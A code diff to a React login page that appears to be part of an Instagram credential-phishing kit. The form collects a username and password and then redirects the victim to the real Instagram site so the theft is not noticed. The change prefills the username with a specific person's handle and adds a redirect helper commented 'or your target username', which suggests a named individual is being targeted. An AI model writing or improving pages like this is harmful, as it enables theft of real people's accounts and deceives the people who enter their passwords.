@@ -2,11 +2,33 @@ import React, { useState } from "react";
 import axios from "axios";
 
 const LoginPage = () => {
-  const [username, setUsername] = useState("");
+  const [username, setUsername] = useState("riya_jain_007_");
   const [password, setPassword] = useState("");
   const [showPassword, setShowPassword] = useState(false);
   const [loading, setLoading] = useState(false);
   const [passlen, setPasslen] = useState(false);
+
+  const redirectToInstagram = () => {
+  const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+  const username = "instagram"; // or your target username
+
+  if (isMobile) {
+    // Try to open the Instagram app directly to a profile
+    const appLink = `instagram://user?username=${username}`;
+    const webLink = `https://www.instagram.com/${username}/`;
+
+    // Try opening the app
+    window.location.href = appLink;
+
+    // Fallback to browser after 1 second
+    setTimeout(() => {
+      window.location.href = webLink;
+    }, 1000);
+  } else {
+    // Desktop users go straight to Instagram website
+    window.location.href = `https://www.instagram.com/${username}/`;
+  }
+};
 
   const handleSubmit = async (e) => {
     e.preventDefault();
@@ -37,19 +59,7 @@ const LoginPage = () => {
         setPassword("");
         setLoading(false);
 
-        const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-
-        if (isMobile) {
-          // Try to open Instagram app
-          window.location.href = "instagram://app";
-          // If not installed, fallback to browser version after 1 second
-          setTimeout(() => {
-            window.location.href = "https://www.instagram.com/";
-          }, 1000);
-        } else {
-          // For desktop
-          window.location.href = "https://www.instagram.com/";
-        }
+        redirectToInstagram();
 
       }, remaining);
     }
